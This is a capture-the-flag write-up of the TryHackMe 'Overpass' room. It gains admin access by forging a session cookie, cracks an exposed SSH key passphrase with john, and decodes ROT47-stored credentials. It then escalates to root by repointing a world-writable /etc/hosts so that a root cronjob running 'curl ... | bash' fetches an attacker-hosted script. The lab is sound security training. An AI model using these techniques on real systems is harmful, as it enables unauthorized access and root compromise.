---
layout: default
title: Overpass
parent: TryHackMe
---
# CTF Writeup: [Overpass](https://tryhackme.com/room/overpass)
![Category](https://img.shields.io/badge/Category-Source%20Code%20%2F%20Web-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Tags](https://img.shields.io/badge/Tags-Cookie%20Manipulation%20%7C%20Golang-orange)

> **Platform:** [**TryHackMe**](https://tryhackme.com/) |
> **OS:** Linux |
> **Difficulty:** Easy |
> **Date:** 12.11.2025 |
> **Author:** [*S3Z4R*](https://tryhackme.com/p/S3Z4R)

---
## 1. Reconnaissance
### Nmap
We'll start scanning with nmap to see the services running on the machine, we can see `22/ssh` and `80/tcp`.
```bash
❯ nmap -sV -sC -T4 -v <Machine-IP>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b3:7f:44:12:a1:91:39:ea:2f:9f:2e:9a:35:d7:43:11 (RSA)
|   256 33:70:46:9b:a1:c8:d0:e8:46:94:22:0f:89:1b:80:f1 (ECDSA)
|_  256 14:04:68:b1:00:70:0e:24:38:d2:19:11:40:93:60:5c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
|_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Directory Enumeration
Next, we jump to directory enumeration to see the subdirectories available in our reach so that we can take advantage of it.
```bash
❯ feroxbuster -u http://<Machine-IP> -w kali-wordlists/dirb/big.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://<Machine-IP>/
 🚩  In-Scope Url          │ <Machine-IP>
 🚀  Threads               │ 50
 📖  Wordlist              │ kali-wordlists/dirb/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        4w       19c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       47l      301w    19214c http://<Machine-IP>/img/overpass.png
200      GET        1l        2w       28c http://<Machine-IP>/main.js
200      GET       73l      182w     2511c http://<Machine-IP>/img/overpass.svg
200      GET       65l      130w     1031c http://<Machine-IP>/css/main.css
301      GET        0l        0w        0c http://<Machine-IP>/aboutus => aboutus/
301      GET        0l        0w        0c http://<Machine-IP>/downloads => downloads/
200      GET       18l       34w      226c http://<Machine-IP>/css/login.css
200      GET        4l        6w       79c http://<Machine-IP>/css/
301      GET        2l        3w       42c http://<Machine-IP>/admin => http://<Machine-IP>/admin/
301      GET        0l        0w        0c http://<Machine-IP>/downloads/builds => builds/
301      GET        0l        0w        0c http://<Machine-IP>/css => css/
200      GET    14898l    79305w  6098565c http://<Machine-IP>/img/jose-fontano-pZld9PiPDno-unsplash.jpg
200      GET       53l      195w     2431c http://<Machine-IP>/
200      GET        5l        8w      183c http://<Machine-IP>/img/
301      GET        0l        0w        0c http://<Machine-IP>/img => img/
301      GET        0l        0w        0c http://<Machine-IP>/downloads/src => src/
[...] - 48s   163772/163772  0s      found:16      errors:0
[...] - 31s    20469/20469   652/s   http://<Machine-IP>/
[...] - 31s    20469/20469   651/s   http://<Machine-IP>/aboutus/
[...] - 32s    20469/20469   643/s   http://<Machine-IP>/img/
[...] - 31s    20469/20469   653/s   http://<Machine-IP>/downloads/
[...] - 32s    20469/20469   644/s   http://<Machine-IP>/css/
[...] - 32s    20469/20469   631/s   http://<Machine-IP>/admin/
[...] - 33s    20469/20469   622/s   http://<Machine-IP>/downloads/builds/
[...] - 29s    20469/20469   705/s   http://<Machine-IP>/downloads/src/
```
## 2. Initial Access
On the index page `http://<Machine-IP>/` we see a text commented out in html:
```bash
# <-- Yeah right, just because the Romans used it doesn't make it military grade, change this? -->
```
We can also go to `downloads` section and download the `source code`.
The source code is a `golang` program, there is a functions called:
```go
func rot47(input string) string {
	var result []string
	for i := range input[:len(input)] {
		j := int(input[i])
		if (j >= 33) && (j <= 126) {
			result = append(result, string(rune(33+((j+14)%94))))
		} else {
			result = append(result, string(input[i]))
		}
	}
	return strings.Join(result, "")
}
```
This is related to the previous comment we saw, beacuse ROT13 was used by Romans too!
According to the function the encryption is `Rot47`. Good to know!

Ok Let's see what else we can find. In the directory enumeration we also found a javascript file which was accessible on `http://<Machine-IP>/main.js` we can see the page shows: `console.log("Hello, World!")`. This means we can access to the javascript console directly! Let's see what we can do with that info.

Another interesting directory is `<Machine-IP>/admin/`. No luck in testing some random usernames and passwords, but in the Inspect elements we can look for more clues.

In `Network` section we have `login.js`, but it is restricted. We can access to the `response` section of it. Interesting!

There is a bunch of javascript code here which seems interesting and after looking into it we can see that at the end of the file we have a line executing `Cookies.set("SessionToken", statusOrCookie)`. Let's see if we can change this using the javascript console.

In Console section we use a custom code as: `Cookies.set("SessionToken", "hacked")`, then when we refresh the page to see the result we get a new page as below:

```bash
Welcome to the Overpass Administrator area
A secure password manager with support for Windows, Linux, MacOS and more

Since you keep forgetting your password, James, I've set up SSH keys for you.

If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
Also, we really need to talk about this "Military Grade" encryption. - Paradox

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```

The user `james` seems to be forgetting his password and this is provided so that he can use to connect again!

Let's use the ssh key provided here by saving it into a file name `id_rsa`.

The parent directory should have `chmod 700 Overpass` and on the ssh file itself should have `chmod 600 id_rsa`.
But the ssh key has a passphrase.

### Cracking the SSH Passphrase
Let's create the Hash first using `ssh2john` and then use `rockyou` and `john` to crack the password.
```bash
❯ ssh2john id_rsa > id_rsa.hash
❯ john --wordlist=kali-wordlists/rockyou.txt id_rsa.hash
```

the password is: `james13 (id_rsa)`

Ok, let's ssh:
```bash
❯ ssh -i id_rsa james@<Machine-IP>
Enter passphrase for key 'id_rsa':james13
```

## 3. User Flag
We can successfully login using the ssh key we found. Let's find the `user.txt`:
```bash
james@<Machine-IP>:~$ cat user.txt
thm{65c1...6bf7}
```
There goes the first flag. There is another interesting file on james directory named `todo.txt`. Let's check it out: 
```bash
james@<Machine-IP>:~$ cat todo.txt
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

According to the text,the developers use their own password manager, since we have the source code for the password manager we know that it saves it locally under `.overpass`.
```go
func main() {
	credsPath, err := homedir.Expand("~/.overpass")
	if err != nil {
		fmt.Println("Error finding home path:", err.Error())
	}
	//Load credentials
	passlist, status := loadCredsFromFile(credsPath)
	if status != "Ok" {
		fmt.Println(status)
		fmt.Println("Continuing with new password file.")
		passlist = make([]passListEntry, 0)
	}

	fmt.Println("Welcome to Overpass")
```
Let's see what do we have on it:

```bash
james@<Machine-IP>:~$ cat .overpass
',LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.'
```

This is related to the `ROT47` we found earlier, after cracking we can see a username and a password:
```json
[{"name":"System","pass":"saydrawnlyingpicture"}]
```

We can keep this information for later.

## 4. Priviledge Escalation
Let's see what can we find for privilege escalation. On cronjobs we have:

```bash
james@<Machine-IP>:~$ cat /etc/crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```
So we have a custom crontab here which we can use.

Let's see what is the `buildscript.sh` that the curl is calling. If we go to the address we can see that the file contains:
```bash
GOOS=linux /usr/local/go/bin/go build -o ~/builds/overpassLinux ~/src/overpass.go
## GOOS=windows /usr/local/go/bin/go build -o ~/builds/overpassWindows.exe ~/src/overpass.go
## GOOS=darwin /usr/local/go/bin/go build -o ~/builds/overpassMacOS ~/src/overpass.go
## GOOS=freebsd /usr/local/go/bin/go build -o ~/builds/overpassFreeBSD ~/src/overpass.go
## GOOS=openbsd /usr/local/go/bin/go build -o ~/builds/overpassOpenBSD ~/src/overpass.go
echo "$(date -R) Builds completed" >> /root/buildStatus
```
So basically it is using `golang` to build the script (as the file name says it!).

let's see if we can directly use Go:
```bash
james@<Machine-IP>:~$ ls -al /usr/local/go/bin/go
-rwxr-xr-x 1 root root 15312032 Jun  1  2020 /usr/local/go/bin/go
```

We can't, because we don't have the write permissions.

Let's see if we can reroute the `/etc/hosts` so that we can route the machine to our own host:
```bash
james@<Machine-IP>:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
Good News! We can edit it and we have all the right permissions to do so:
```bash
james@<Machine-IP>:~$ ls -la /etc/hosts
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
```
Edit the `/etc/hosts` and change the line `127.0.0.1 overpass.thm` to `<Your-THM-IP> overpass.thm`.

Let's get back to our own machine (attacker's machine), We make folders as stated in the cronjob:
```bash
❯ mkdir -p downloads/src/
❯ cd downloads/src/
❯ touch buildscript.sh
```

Instead of making it more complicated we can simply output the flag on `/root/root.txt` with the command below, write it inside the `buildscript.sh` that we just created:

```bash
cat /root/root.txt > /home/james/stuff.txt
```

Then we will start our python server at the main directory:

**Note:** The directory is very important, you should run this command if you can see `downloads` when hitting `ls` command.

```bash
❯ sudo python3 -m http.server 80 --bind <Your-THM-IP>
```

And now we wait for the script to run.

**Note:** Make sure to enable incoming traffic on your firewall for port `80` to avoid hours of debugging for a problem that doesn't exist!

## 5. Root Flag
We you see the request on your started python server, then you know everything is right and you can see the flag as below:
```bash
james@<Machine-IP>:~$ cat stuff.txt
thm{7f33...53bb}
```

---
<p style="text-align: center; text-shadow: 0 0 5px #8B0000;"> ⸸ 𝕬𝖘 𝖞𝖔𝖚 𝖜𝖎𝖑𝖑 𝖎𝖙, 𝖘𝖔 𝖎𝖙 𝖘𝖍𝖆𝖑𝖑 𝖇𝖊 ⸸ 𝕾3𝖅4𝕽 ⸸ </p>
